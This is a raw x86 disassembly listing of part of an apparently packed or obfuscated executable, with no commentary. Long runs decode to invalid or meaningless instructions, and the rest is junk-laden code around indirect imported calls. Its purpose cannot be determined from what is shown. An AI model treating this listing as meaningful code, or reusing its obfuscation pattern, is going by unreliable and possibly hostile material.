  402281:	das    
  402282:	add    DWORD PTR ds:0xcb67,esi
  402287:	ins    BYTE PTR es:[edi],dx
  402288:	sub    ebx,edi
  40228a:	int    0x7f
  40228c:	mov    ebp,0x610247ad
  402291:	fbld   TBYTE PTR [esi]
  402293:	lods   al,BYTE PTR ds:[esi]
  402294:	or     DWORD PTR [edi+esi*4],0xffffffd5
  402298:	cmp    DWORD PTR [ecx*4-0x23d32771],edx
  40229f:	popa   
  4022a0:	mov    esp,0x3da72c51
  4022a5:	(bad)  
  4022a6:	shl    DWORD PTR [ecx+0x4e04d03d],cl
  4022ac:	pusha  
  4022ad:	xchg   BYTE PTR [edx+eax*4],bh
  4022b0:	gs jno 0x4022ef
  4022b3:	lds    ebx,FWORD PTR [edx]
  4022b5:	jl     0x402293
  4022b7:	cmp    al,0x5b
  4022b9:	dec    edi
  4022ba:	mov    al,0x1c
  4022bc:	call   0xc2afd892
  4022c1:	or     al,0x8a
  4022c3:	outs   dx,DWORD PTR ds:[esi]
  4022c4:	jbe    0x4022a0
  4022c6:	call   0x85a6f82a
  4022cb:	int    0x5f
  4022cd:	xchg   esp,eax
  4022ce:	or     al,0xfb
  4022d0:	push   ecx
  4022d1:	cmp    eax,0x45012136
  4022d6:	cmp    DWORD PTR [edi-0x68],edx
  4022d9:	js     0x402343
  4022db:	clc    
  4022dc:	adc    DWORD PTR [eax],ecx
  4022de:	and    bl,ch
  4022e0:	sti    
  4022e1:	push   ss
  4022e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022e3:	scas   al,BYTE PTR es:[edi]
  4022e4:	js     0x402269
  4022e6:	and    ebp,DWORD PTR [ecx]
  4022e8:	scas   al,BYTE PTR es:[edi]
  4022e9:	(bad)  
  4022ea:	in     eax,dx
  4022eb:	daa    
  4022ec:	les    esi,FWORD PTR fs:0xa6464192
  4022f3:	cmp    DWORD PTR [eax+ebx*8-0x34f5158a],ebp
  4022fa:	adc    BYTE PTR [eax+ebx*1-0x1b68c57f],cl
  402301:	and    esi,DWORD PTR [ecx+0x33]
  402304:	std    
  402305:	and    eax,0x506437b1
  40230a:	idiv   BYTE PTR [ecx+0x4857445b]
  402310:	mov    DWORD PTR [eax+0x28a9b6e9],esi
  402316:	mul    BYTE PTR [edi-0x49]
  402319:	xor    ch,BYTE PTR [eax]
  40231b:	pop    esi
  40231c:	xor    ah,BYTE PTR [edx]
  40231e:	std    
  40231f:	push   esp
  402320:	push   ecx
  402321:	arpl   WORD PTR [esp+esi*8],bx
  402324:	in     eax,0x36
  402326:	xchg   ecx,eax
  402327:	sub    eax,0x233350b4
  40232c:	int    0x5f
  40232e:	rol    DWORD PTR [esi+0x104f8f47],1
  402334:	shl    BYTE PTR [ebx],0x5c
  402337:	or     DWORD PTR [eax+eiz*1-0x73c2e7e0],0xb4153a12
  402342:	stos   BYTE PTR es:[edi],al
  402343:	add    esp,DWORD PTR [ecx+0xa]
  402346:	repnz or al,bh
  402349:	xor    ch,BYTE PTR [eax]
  40234b:	push   ebx
  40234c:	mov    WORD PTR [edx],gs
  40234e:	call   0xa192:0xdaaeb7ef
  402355:	pop    ebx
  402356:	push   edx
  402357:	xor    ch,BYTE PTR [ebx]
  402359:	inc    eax
  40235a:	jno    0x402336
  40235c:	jnp    0x4023a4
  40235e:	das    
  40235f:	sbb    ah,bl
  402361:	fiadd  DWORD PTR [eax+edx*4-0x3fe0a9bb]
  402368:	mov    ebx,ebp
  40236a:	ja     0x4023c9
  40236c:	dec    ebp
  40236d:	jo     0x402377
  40236f:	addr16 pusha 
  402371:	adc    ebx,DWORD PTR [esi+0x4add220a]
  402377:	std    
  402378:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402379:	adc    al,0x31
  40237b:	or     DWORD PTR [edi+0x40544e09],edi
  402381:	(bad)  
  402382:	fmulp  st(3),st
  402384:	ja     0x40235b
  402386:	daa    
  402387:	daa    
  402388:	es in  al,0x17
  40238b:	gs mov al,0x9d
  40238e:	dec    esi
  40238f:	lock xor eax,0x2d2525df
  402395:	mov    dh,0x4
  402397:	mov    DWORD PTR ds:0x34caa97c,0x77ec0600
  4023a1:	mov    ebx,0xb8de9a67
  4023a6:	stos   BYTE PTR es:[edi],al
  4023a7:	inc    esp
  4023a8:	in     al,dx
  4023a9:	ds ret 
  4023ab:	test   al,0xd1
  4023ad:	pushf  
  4023ae:	mov    dh,0xfb
  4023b0:	and    BYTE PTR [edi],ch
  4023b2:	mov    BYTE PTR [ebx],ah
  4023b4:	add    DWORD PTR [eax+0x19],ebp
  4023b7:	retf   0x8945
  4023ba:	in     eax,0x55
  4023bc:	lahf   
  4023bd:	xchg   esi,eax
  4023be:	imul   al
  4023c0:	ins    DWORD PTR es:[edi],dx
  4023c1:	retf   
  4023c2:	dec    ebp
  4023c3:	xchg   ebp,eax
  4023c4:	fcom   DWORD PTR [ecx-0x2e446cb]
  4023ca:	outs   dx,BYTE PTR ds:[esi]
  4023cb:	push   esi
  4023cc:	shl    BYTE PTR [ecx+ebp*8-0x24],cl
  4023d0:	pop    ecx
  4023d1:	retf   
  4023d2:	jno    0x4023e6
  4023d4:	fstp   TBYTE PTR [edi+0x1b]
  4023d7:	pop    ds
  4023d8:	jge    0x402406
  4023da:	lahf   
  4023db:	jmp    0x97cc02e4
  4023e0:	mov    ah,0x3a
  4023e2:	inc    eax
  4023e3:	inc    esp
  4023e4:	inc    ecx
  4023e5:	outs   dx,BYTE PTR ds:[esi]
  4023e6:	test   BYTE PTR [ebp+0x32],ah
  4023e9:	daa    
  4023ea:	push   eax
  4023eb:	pop    eax
  4023ec:	outs   dx,BYTE PTR ds:[esi]
  4023ed:	push   esi
  4023ee:	push   edx
  4023ef:	das    
  4023f0:	xor    dl,BYTE PTR [esi+0x55]
  4023f3:	xchg   ebp,eax
  4023f4:	repz jno 0x4023c8
  4023f7:	xchg   ebp,eax
  4023f8:	pop    ds
  4023f9:	jmp    0x2d0f:0x68521ce9
  402400:	add    BYTE PTR [eax],al
  402402:	sbb    DWORD PTR ds:0x428439,0x428461
  40240c:	call   0x422281
  402411:	mov    ecx,DWORD PTR [ebp-0x68]
  402414:	mov    edx,DWORD PTR ds:0x428459
  40241a:	add    DWORD PTR ds:0x428375,edx
  402420:	mov    edx,DWORD PTR [ebp-0x64]
  402423:	sub    DWORD PTR ds:0x428545,ecx
  402429:	xor    eax,ecx
  40242b:	sub    DWORD PTR ds:0x4284dd,edi
  402431:	mov    ecx,DWORD PTR [ebp-0x70]
  402434:	mov    edx,DWORD PTR [ebp-0x6c]
  402437:	neg    DWORD PTR ds:0x42857d
  40243d:	sub    eax,ecx
  40243f:	mov    ecx,DWORD PTR ds:0x422738
  402445:	lea    eax,[eax+ecx*1-0x27d2]
  40244c:	not    edx
  40244e:	mov    ecx,DWORD PTR [ebp-0x1c]
  402451:	adc    edx,DWORD PTR ds:0x4284c5
  402457:	mov    edx,DWORD PTR [ebp-0x2c]
  40245a:	neg    DWORD PTR ds:0x42843d
  402460:	or     ecx,0x4f00
  402466:	and    ecx,edx
  402468:	cmp    DWORD PTR ds:0x42832d,0x0
  40246f:	mov    DWORD PTR ds:0x428549,ebx
  402475:	mov    edx,DWORD PTR ds:0x428445
  40247b:	jmp    0x4024db
  402480:	mov    DWORD PTR ds:0x428425,0xc4d
  40248a:	cmp    DWORD PTR ds:0x42832d,0x0
  402491:	jg     0x4024b5
  402497:	push   DWORD PTR [ebp-0x24]
  40249a:	push   DWORD PTR [ebp-0x28]
  40249d:	call   DWORD PTR ds:0x42dfe8
  4024a3:	xor    edx,DWORD PTR ds:0x428421
  4024a9:	adc    DWORD PTR ds:0x4284ed,ecx
  4024af:	add    edx,0x747e
  4024b5:	or     DWORD PTR ds:0x42854d,0x36ec
  4024bf:	neg    DWORD PTR ds:0x428545
  4024c5:	adc    edx,DWORD PTR ds:0x428341
  4024cb:	sbb    DWORD PTR ds:0x428581,edi
  4024d1:	sbb    DWORD PTR ds:0x42854d,0x669d
  4024db:	mov    edx,DWORD PTR [ebp-0x34]
  4024de:	or     ecx,edx
  4024e0:	xor    ecx,0x5fdd
  4024e6:	cmp    ecx,DWORD PTR [eax]
  4024e8:	mov    DWORD PTR ds:0x4284f1,0x2fd8
  4024f2:	jne    0x408bb3
  4024f8:	mov    ecx,DWORD PTR [esi]
  4024fa:	cmp    DWORD PTR ds:0x428501,0x0
  402501:	mov    DWORD PTR ds:0x428415,edi
  402507:	not    edx
  402509:	mov    DWORD PTR ds:0x4284f1,0x71cc
  402513:	jmp    0x402572
  402518:	mov    eax,ds:0x428501
  40251d:	mov    eax,0x2d63
  402522:	cmp    DWORD PTR ds:0x428501,0x0
  402529:	je     0x40255f
  40252f:	push   0x428369
  402534:	push   DWORD PTR [ebp-0x18]
  402537:	push   0x428255
  40253c:	push   0x6ba7
  402541:	call   DWORD PTR ds:0x42dfec
  402547:	sbb    edx,DWORD PTR ds:0x428375
  40254d:	xor    edx,DWORD PTR ds:0x42836d
  402553:	and    edx,edx
  402555:	mov    DWORD PTR ds:0x428429,0x7db9
  40255f:	add    DWORD PTR ds:0x428465,edx
  402565:	inc    edx
  402566:	and    DWORD PTR ds:0x428339,ecx
  40256c:	or     DWORD PTR ds:0x428481,ecx
  402572:	mov    eax,DWORD PTR [esi+0x4]
  402575:	shrd   ecx,eax,0x2
  402579:	shr    eax,0x2
  40257c:	adc    DWORD PTR ds:0x428371,ecx
  402582:	mov    eax,DWORD PTR [esi]
  402584:	movzx  edx,BYTE PTR ds:0x428431
  40258b:	or     DWORD PTR ds:0x428565,edx
  402591:	mov    edx,DWORD PTR [esi+0x4]
  402594:	shl    eax,0x1e
  402597:	xor    ecx,edi
  402599:	xor    eax,eax
  40259b:	or     eax,ecx
  40259d:	jmp    0x40293e
  4025a2:	cmp    al,0x5
  4025a4:	ja     0x4025d8
  4025a6:	jl     0x40255c
  4025a8:	mov    esp,0xb45d5307
  4025ad:	iret   
  4025ae:	or     BYTE PTR [esi],bl
  4025b0:	xor    bl,ch
  4025b2:	mov    esi,0xbdbebeda
  4025b7:	les    edi,FWORD PTR [esi-0x6988d242]
  4025bd:	mov    WORD PTR [esi],gs
  4025bf:	mov    edx,0xecb09e2b
  4025c4:	fdivr  st,st(1)
  4025c6:	pop    esp
  4025c7:	loopne 0x40256a
  4025c9:	xchg   bx,ax
  4025cb:	jno    0x4025cb
  4025cd:	aaa    
  4025ce:	sbb    BYTE PTR [ebx],0xac
  4025d1:	ja     0x402595
  4025d3:	js     0x40259d
  4025d5:	jle    0x4025cd
  4025d7:	inc    edi
  4025d8:	and    al,0x10
  4025da:	loop   0x4025ea
  4025dc:	and    DWORD PTR [edx],0xffffffa6
  4025df:	(bad)  
  4025e0:	rcl    DWORD PTR [ebx+0xd596525],cl
  4025e6:	push   cs
  4025e7:	mov    dh,0x91
  4025e9:	or     BYTE PTR [ecx],bl
  4025eb:	hlt    
  4025ec:	repz xchg edx,eax
  4025ee:	pop    edx
  4025ef:	(bad)  
  4025f0:	adc    DWORD PTR [esi-0x78009892],ebx
  4025f6:	cs dec esi
  4025f8:	aad    0x4e
  4025fa:	punpcklwd mm5,DWORD PTR [ecx]
  4025fd:	(bad)  [eax+0xac2cc2a]
  402603:	push   cs
  402604:	iret   
  402605:	fnsave [ecx+0x1c]
  402608:	push   cs
  402609:	sti    
  40260a:	popf   
  40260b:	sub    DWORD PTR [edi+eiz*4+0x64db1eb7],ecx
  402612:	add    edi,edi
  402614:	jg     0x402597
  402616:	mov    al,ds:0x9028fa0c
  40261b:	inc    eax
  40261c:	or     DWORD PTR [esi+0x2a],eax
  40261f:	out    dx,al
  402620:	push   ebp
  402621:	shl    DWORD PTR [edx],0xc2
  402624:	nop
  402625:	lock (bad) 
  402627:	push   edx
  402628:	fadd   DWORD PTR [ebp+0x39877e5b]
  40262e:	adc    esi,DWORD PTR [esi-0x7e]
  402631:	adc    ecx,ecx
  402633:	push   0x76
  402635:	(bad)  
  402637:	push   edx
  402638:	gs inc edx
  40263a:	or     BYTE PTR [ebx],dh
  40263c:	dec    esi
  40263d:	cli    
  40263e:	cmp    eax,0x3bfb1596
  402643:	sbb    eax,edi
  402645:	ins    DWORD PTR es:[edi],dx
  402646:	retf   0x3b32
  402649:	pop    es
  40264a:	xchg   ecx,eax
  40264b:	mov    edx,0xb047395
  402650:	mov    cl,0xf2
  402652:	ficomp DWORD PTR [ecx-0x12]
  402655:	std    
  402656:	cdq    
  402657:	rcr    BYTE PTR [eax+eax*1+0x72],cl
  40265b:	nop
  40265c:	into   
  40265d:	fistp  DWORD PTR [esi]
  40265f:	in     al,dx
  402660:	(bad)  
  402661:	pop    esi
  402662:	fbstp  TBYTE PTR [ebp-0x6a]
  402665:	mov    eax,ds:0xd7ce137f
  40266a:	jmp    0x4026ce
  40266c:	rol    ah,1
  40266e:	int3   
  40266f:	icebp  
  402670:	xchg   edi,eax
  402671:	pop    edx
  402672:	sbb    DWORD PTR [ebp+0x28],eax
  402675:	pop    ds
  402676:	sub    al,0x2a
  402678:	xchg   BYTE PTR [edx+esi*1-0x1b],ah
  40267c:	lock fild QWORD PTR [edi-0x29]
  402680:	push   ds
  402681:	xor    edi,esi
  402683:	loope  0x4026db
  402685:	push   eax
  402686:	mov    ebp,0x9379c72f
  40268b:	ret    0x257e
  40268e:	and    al,0xb2
  402690:	das    
  402691:	out    0x6a,al
  402693:	pop    esi
  402694:	sub    BYTE PTR [eax-0x2f],bh
  402697:	mov    ds:0x12f865ac,al
  40269c:	mov    al,BYTE PTR [esi]
  40269e:	xchg   DWORD PTR [ebx-0x54264e53],ebp
  4026a4:	in     eax,dx
  4026a5:	aam    0xca
  4026a7:	inc    edx
  4026a8:	jns    0x402721
  4026aa:	inc    ebx
  4026ab:	gs (bad) 
  4026ad:	adc    esi,DWORD PTR [edx+0x5a]
  4026b0:	mov    dh,0xce
  4026b2:	(bad)  
  4026b4:	xor    ch,BYTE PTR [ebx-0x440441a1]
  4026ba:	jbe    0x402642
  4026bc:	mov    al,0x80
  4026be:	ret    0xc150
  4026c1:	es sbb al,0x38
  4026c4:	pop    ds
  4026c5:	test   BYTE PTR [ebx],bh
  4026c7:	leave  
  4026c8:	sbb    dl,BYTE PTR [ebx]
  4026ca:	add    esi,0x2f
  4026cd:	mov    edi,DWORD PTR [ebx+0x3dee1dd7]
  4026d3:	popa   
  4026d4:	add    al,0xef
  4026d6:	adc    BYTE PTR [edi-0x6e3a9f2c],bh
  4026dc:	out    0x1,eax
  4026de:	adc    al,0x80
  4026e0:	jno    0x402674
  4026e2:	sub    al,0xd5
  4026e4:	mov    ds:0x55c7c6db,eax
  4026e9:	xchg   edx,eax
  4026ea:	xchg   esp,eax
  4026eb:	idiv   eax
  4026ed:	sub    al,0x44
  4026ef:	pop    esp
  4026f0:	adc    eax,0x5da42352
  4026f5:	jo     0x402690
  4026f7:	fmul   DWORD PTR [edx-0x43]
  4026fa:	adc    esi,ebx
  4026fc:	lods   eax,DWORD PTR ds:[esi]
  4026fd:	add    al,0x99
  4026ff:	popfw  
  402701:	pop    edi
  402702:	or     ch,0x3a
  402705:	pop    eax
  402706:	push   esi
  402707:	mov    bl,al
  402709:	dec    edx
  40270a:	push   0x53da307c
  40270f:	out    dx,al
  402710:	dec    esi
  402711:	push   esp
  402712:	push   esp
  402713:	jmp    0x8f93dc86
  402718:	dec    esi
  402719:	push   es
  40271a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40271b:	sti    
  40271c:	sahf   
  40271d:	push   esp
  40271e:	out    dx,al
  40271f:	sub    edi,DWORD PTR [ebx+0x2d]
  402722:	mov    ds:0x61827e7c,al
  402727:	sbb    al,0x60
  402729:	pop    eax
  40272a:	mov    ebp,0xdab2c614
  40272f:	mov    eax,0x6a886715
  402734:	addr16 mov esp,0x36374172
  40273a:	mov    esp,0x5d939952
  40273f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402740:	(bad)  
  402742:	js     0x40275b
  402744:	push   ecx
  402745:	push   esp
  402746:	ins    DWORD PTR es:[edi],dx
  402747:	add    BYTE PTR [esi+0x77],ah
  40274a:	and    al,0x9f
  40274c:	shl    DWORD PTR [ebx],0x4f
  40274f:	aad    0x5e
  402751:	sub    ebx,DWORD PTR [ecx+0x23]
  402754:	arpl   WORD PTR [edx-0x54],di
  402757:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402758:	pop    es
  402759:	fisub  DWORD PTR [edx+ebx*8]
  40275c:	or     ah,dl
  40275e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40275f:	cmc    
  402760:	dec    ecx
  402761:	and    eax,DWORD PTR [eax-0x64]
  402764:	pop    esi
  402765:	(bad)  
  402766:	push   edi
  402767:	jbe    0x40272b
  402769:	push   ecx
  40276a:	jmp    0xf655:0x607fd18f
  402771:	imul   esp,eax,0xfd364d57
  402777:	test   eax,0x5d37b427
  40277c:	pop    edx
  40277d:	nop
  40277e:	les    eax,FWORD PTR [edi+0x3]
  402781:	imul   eax,DWORD PTR [ecx],0x63
  402784:	cmp    eax,0x634ade83
  402789:	jmp    0x4027b1
  40278b:	cmp    eax,0x85c88cf5
  402790:	jne    0x4027a4
  402792:	out    dx,eax
  402793:	add    ebx,ebp
  402795:	mov    WORD PTR [ebx],ds
  402797:	xchg   ebx,eax
  402798:	mov    ecx,0xd270a8c7
  40279d:	dec    edi
  40279e:	pop    esp
  40279f:	push   ebx
  4027a0:	fild   WORD PTR [esi+0x7657b660]
  4027a6:	push   esi
  4027a7:	jecxz  0x4027cf
  4027a9:	imul   ebx,DWORD PTR ds:[esi+0x57],0x19
  4027ae:	aas    
  4027af:	daa    
  4027b0:	mov    esp,0x35e14347
  4027b5:	nop
  4027b6:	or     BYTE PTR ds:0x7ee17fd8,0x48
  4027bd:	out    dx,eax
  4027be:	loop   0x40283d
  4027c0:	or     al,BYTE PTR [ecx+ebp*4+0x12f36d16]
  4027c7:	in     eax,0x45
  4027c9:	loop   0x40279c
  4027cb:	mov    ds:0x9d70fdef,al
  4027d0:	sti    
  4027d1:	(bad)  
  4027d2:	aam    0x6f
  4027d4:	call   0x1cc2:0x487a1683
  4027db:	push   ebp
  4027dc:	mov    ah,0x7d
  4027de:	fimul  WORD PTR [edx+0x4e]
  4027e1:	cli    
  4027e2:	pop    ecx
  4027e3:	scas   eax,DWORD PTR es:[edi]
  4027e4:	test   eax,0xef3a7e5
  4027e9:	cwde   
  4027ea:	(bad)  
  4027eb:	jae    0x40278b
  4027ed:	mov    ds:0xf12c6f85,al
  4027f2:	mov    esi,0xadc2ab2a
  4027f7:	inc    ebx
  4027f8:	push   ecx
  4027f9:	cbw    
  4027fb:	cmp    al,0x74
  4027fd:	dec    esp
  4027fe:	xchg   edi,eax
  4027ff:	das    
  402800:	sub    edx,DWORD PTR [edi+0x1e635fe2]
  402806:	xor    eax,0x602d5451
  40280b:	das    
  40280c:	(bad)  
  40280d:	shl    DWORD PTR [edi-0x7e8d86a3],1
  402813:	add    DWORD PTR [ebx+esi*1],eax
  402816:	or     al,0xaf
  402818:	or     al,0x88
  40281a:	cli    
  40281b:	mov    bl,0x48
  40281d:	popa   
  40281e:	inc    ebp
  40281f:	stos   DWORD PTR es:[edi],eax
  402820:	shl    DWORD PTR [edx],0x0
  402823:	sub    ebx,edx
  402825:	xchg   edi,eax
  402826:	xchg   ebx,eax
  402827:	loop   0x40284d
  402829:	cmp    eax,0xbd96696
  40282e:	mov    bl,0xb6
  402830:	xchg   edi,eax
  402831:	hlt    
  402832:	cmp    eax,0xbffa7fc3
  402837:	xchg   DWORD PTR ds:[eax],ebx
  40283a:	mov    eax,0x975fd113
  40283f:	adc    edi,DWORD PTR [edi-0x3db9ff0f]
  402845:	sub    DWORD PTR [ebp-0x4573461f],ebx
  40284b:	fld    TBYTE PTR [eax-0x43]
  40284e:	addr16 cli 
  402850:	dec    eax
  402851:	sbb    al,0x64
  402853:	xchg   DWORD PTR [ebx+0x2146235a],esi
  402859:	ret    
  40285a:	cmp    BYTE PTR [esi+0x4],bl
  40285d:	(bad)  
  40285e:	outs   dx,BYTE PTR ds:[esi]
  40285f:	pushf  
  402860:	xchg   BYTE PTR [ebp+0x6c79a702],dl
  402866:	leave  
  402867:	or     al,0x61
  402869:	mov    ebx,0x82846667
  40286e:	xor    eax,0x38bc906e
  402873:	xor    DWORD PTR [ecx+0x67899d8],ecx
  402879:	repz dec edx
  40287b:	outs   dx,DWORD PTR ds:[esi]
  40287c:	fimul  DWORD PTR [ebx]
  40287e:	scas   eax,DWORD PTR es:[edi]
  40287f:	ja     0x40280e
  402881:	les    edi,FWORD PTR [ebx-0x5a81322a]
  402887:	std    
  402888:	frndint 
  40288a:	test   BYTE PTR [ebx+edi*4+0x40],al
  40288e:	and    al,BYTE PTR [ecx+0xb]
  402891:	xchg   BYTE PTR [eax-0x4a],dl
  402894:	jp     0x4028c1
  402896:	xor    ch,BYTE PTR [esi+0x34d218d6]
  40289c:	pop    edi
  40289d:	xor    al,0x9a
  40289f:	add    DWORD PTR [esi+ebp*2+0x68],eax
  4028a3:	pop    es
  4028a4:	es or  eax,0x702f4b12
  4028aa:	aad    0x44
  4028ac:	ret    0x50dd
  4028af:	or     al,0x16
  4028b1:	mov    edi,0x2bba40e7
  4028b6:	jno    0x402861
  4028b8:	es int3 
  4028ba:	jmp    0x402900
  4028bc:	sub    BYTE PTR [edx-0x274af78d],0x7b
  4028c3:	cmp    esi,eax
  4028c5:	mov    eax,0x57d4d4d7
  4028ca:	mov    ebp,0xc5e6d1e8
  4028cf:	mov    eax,0x257b77b1
  4028d4:	das    
  4028d5:	(bad)  
  4028d6:	sbb    DWORD PTR [edi],ecx
  4028d8:	jbe    0x39360fef
  4028de:	or     eax,0x921c258f
  4028e3:	cld    
  4028e4:	adc    DWORD PTR [esi+0x59b0740b],ecx
  4028ea:	mov    edx,0xde367229
  4028ef:	ins    DWORD PTR es:[edi],dx
  4028f0:	js     0x40294b
  4028f2:	imul   eax,esp,0x14
  4028f5:	and    BYTE PTR [esp+eiz*8-0x6cc9da20],dl
  4028fc:	repnz cli 
  4028fe:	pop    edi
  4028ff:	dec    ebp
  402900:	into   
  402901:	mov    ebx,DWORD PTR [eax+0x648b1fae]
  402907:	add    eax,0x59deefc4
  40290c:	push   edi
  40290d:	js     0x40296f
  40290f:	or     eax,0xff24f2c6
  402914:	jne    0x4028cb
  402916:	and    edx,DWORD PTR cs:[edx]
  402919:	xor    eax,0x70239018
  40291e:	lds    eax,FWORD PTR [ebx+edx*2-0x65]
  402922:	mov    cl,0x77
  402924:	iret   
  402925:	test   al,0xf1
  402927:	sar    esp,1
  402929:	or     eax,0x9c07af4a
  40292e:	add    bh,BYTE PTR [esi+ecx*2+0x47d703d6]
  402935:	sbb    al,0x6d
  402937:	aad    0x1a
  402939:	cmp    DWORD PTR [esi],edi
  40293b:	dec    esp
  40293c:	xchg   esi,eax
  40293d:	les    ecx,FWORD PTR [ebx+0x13bec4d]
  402943:	mov    DWORD PTR ds:0x428429,0x7e19
  40294d:	jne    0x402a3a
  402953:	cmp    DWORD PTR ds:0x4284f1,0x0
  40295a:	mov    DWORD PTR ds:0x428545,edi
  402960:	mov    ecx,0x5bac
  402965:	mov    ecx,0x785
  40296a:	jmp    0x4029c0
  40296f:	mov    DWORD PTR ds:0x4284f5,0x7d3d
  402979:	mov    eax,ds:0x428351
  40297e:	cmp    DWORD PTR ds:0x4284f1,0x0
  402985:	jl     0x4029a6
  40298b:	push   0x25e9
  402990:	call   DWORD PTR ds:0x42e238
  402996:	and    ecx,0x7efc
  40299c:	and    DWORD PTR ds:0x428481,0x428369
  4029a6:	sub    edx,edx
  4029a8:	and    DWORD PTR ds:0x428555,0x3b56
  4029b2:	mov    edx,DWORD PTR ds:0x42852d
  4029b8:	mov    edx,DWORD PTR [edx]
  4029ba:	add    DWORD PTR ds:0x428445,edx
  4029c0:	mov    eax,DWORD PTR [ebp-0xc]
  4029c3:	mov    ecx,DWORD PTR [ebp+0x20]
  4029c6:	sub    DWORD PTR ds:0x428375,edi
  4029cc:	xor    DWORD PTR [eax],ecx
  4029ce:	mov    eax,DWORD PTR [ebp-0xc]
  4029d1:	or     edx,ecx
  4029d3:	mov    ecx,DWORD PTR [ebp+0x18]
  4029d6:	or     DWORD PTR ds:0x428451,ebx
  4029dc:	mov    edx,DWORD PTR [ebp+0x1c]
  4029df:	add    DWORD PTR ds:0x42834d,0x2a87
  4029e9:	shrd   ecx,edx,0x2
  4029ed:	sub    DWORD PTR ds:0x42845d,0x428435
  4029f7:	mov    DWORD PTR [ebp-0x14],ecx
  4029fa:	mov    ecx,DWORD PTR [ebp+0x18]
  4029fd:	xor    DWORD PTR [ebp-0x14],edi
  402a00:	shr    edx,0x2
  402a03:	xor    edx,0x4270
  402a09:	mov    edx,DWORD PTR [ebp+0x1c]
  402a0c:	sbb    DWORD PTR ds:0x428409,0x428425
  402a16:	xor    edx,edx
  402a18:	and    DWORD PTR ds:0x428579,0x428331
  402a22:	or     edx,DWORD PTR [ebp-0x14]
  402a25:	or     DWORD PTR ds:0x428451,0x6ae7
  402a2f:	shl    ecx,0x1e
  402a32:	xor    DWORD PTR ds:0x428369,edx
  402a38:	sub    DWORD PTR [eax],edx
  402a3a:	xor    ecx,ecx
  402a3c:	add    ecx,DWORD PTR ds:0x4284c1
  402a42:	mov    eax,ds:0x428539
  402a47:	sub    eax,ecx
  402a49:	add    ecx,DWORD PTR [ecx+eax*1]
  402a4c:	mov    eax,ds:0x422580
  402a51:	add    edx,DWORD PTR ds:0x428365
  402a57:	mov    ecx,DWORD PTR [ebp-0xc]
  402a5a:	cmp    DWORD PTR ds:0x428419,0x0
  402a61:	not    edx
  402a63:	not    DWORD PTR ds:0x42834d
  402a69:	movzx  edx,WORD PTR ds:0x42833d
  402a70:	jmp    0x402ae1
  402a75:	mov    edx,0x6743
  402a7a:	cmp    DWORD PTR ds:0x428419,0x0
  402a81:	jg     0x402ac1
  402a87:	push   0x8e71
  402a8c:	push   DWORD PTR [ebp-0x1c]
  402a8f:	call   DWORD PTR ds:0x42dff0
  402a95:	movzx  edx,WORD PTR ds:0x428469
  402a9c:	sbb    edx,DWORD PTR ds:0x428561
  402aa2:	mov    DWORD PTR ds:0x428469,edx
  402aa8:	movzx  edx,BYTE PTR ds:0x428471
  402aaf:	adc    DWORD PTR ds:0x428549,edx
  402ab5:	or     edx,0x3af6
  402abb:	and    edx,DWORD PTR ds:0x42832d
  402ac1:	or     DWORD PTR ds:0x428369,0x67f9
  402acb:	add    edx,0x3b45
  402ad1:	or     edx,DWORD PTR ds:0x4284d1
  402ad7:	adc    DWORD PTR ds:0x428549,0x3eb0
  402ae1:	mov    eax,DWORD PTR [eax]
  402ae3:	cmp    DWORD PTR ds:0x428351,0x0
  402aea:	mov    DWORD PTR ds:0x4284d9,0xab9
  402af4:	mov    edx,DWORD PTR ds:0x42836d
  402afa:	mov    DWORD PTR ds:0x428341,0x238f
  402b04:	jmp    0x402b79
  402b09:	mov    DWORD PTR ds:0x428575,ecx
  402b0f:	cmp    DWORD PTR ds:0x428351,0x0
  402b16:	ja     0x402b5f
  402b1c:	push   DWORD PTR [ebp-0x14]
  402b1f:	push   0x428191
  402b24:	push   DWORD PTR [ebp-0x10]
  402b27:	push   0x428238
  402b2c:	push   DWORD PTR [ebp-0x18]
  402b2f:	push   0x24b6
  402b34:	call   DWORD PTR ds:0x42e23c
  402b3a:	mov    edx,DWORD PTR ds:0x428375
  402b40:	sub    DWORD PTR ds:0x42835d,edx
  402b46:	sbb    DWORD PTR ds:0x428449,ebx
  402b4c:	movzx  edx,BYTE PTR ds:0x42832d
  402b53:	adc    DWORD PTR ds:0x42846d,edx
  402b59:	add    DWORD PTR ds:0x42856d,ebx
  402b5f:	xor    edx,edx
  402b61:	or     edx,DWORD PTR ds:0x42857d
  402b67:	xor    edx,DWORD PTR ds:0x4284e5
  402b6d:	mov    DWORD PTR ds:0x42857d,edx
  402b73:	add    edx,0x71a6
  402b79:	add    eax,DWORD PTR [ecx]
  402b7b:	sub    ecx,0x1eef
  402b81:	mov    DWORD PTR [ebp-0x14],eax
  402b84:	or     ecx,DWORD PTR ds:0x42845d
  402b8a:	mov    ecx,DWORD PTR [ebx]
  402b8c:	mov    eax,DWORD PTR [ebx+0x4]
  402b8f:	shrd   ecx,eax,0x2
  402b93:	cmp    DWORD PTR ds:0x42832d,0x0
  402b9a:	mov    DWORD PTR ds:0x4284d1,0x61cd
  402ba4:	mov    edx,DWORD PTR ds:0x428339
  402baa:	mov    DWORD PTR ds:0x428345,edx
  402bb0:	jmp    0x402c95
  402bb5:	mov    DWORD PTR ds:0x428349,0x124b
  402bbf:	mov    DWORD PTR ds:0x428421,0x5ddc
  402bc9:	cmp    DWORD PTR ds:0x42832d,0x0
  402bd0:	jle    0x402bf9
  402bd6:	push   0x6f74
  402bdb:	call   DWORD PTR ds:0x42e0ac
  402be1:	sub    DWORD PTR ds:0x4284ed,edx
  402be7:	and    edx,DWORD PTR ds:0x428425
  402bed:	mov    edx,DWORD PTR ds:0x428575
  402bf3:	xor    DWORD PTR ds:0x4284c5,edx
  402bf9:	mov    edx,DWORD PTR ds:0x4285b9
  402bff:	mov    edx,DWORD PTR [edx]
  402c01:	xor    DWORD PTR ds:0x428429,edx
  402c07:	and    DWORD PTR ds:0x42834d,0x245f
  402c11:	cmp    DWORD PTR ds:0x428341,0x0
  402c18:	mov    DWORD PTR ds:0x4284e1,0x70c6
  402c22:	not    edx
  402c24:	mov    edx,0x462e
  402c29:	jmp    0x402c95
  402c2e:	mov    DWORD PTR ds:0x428481,edx
  402c34:	cmp    DWORD PTR ds:0x428341,0x0
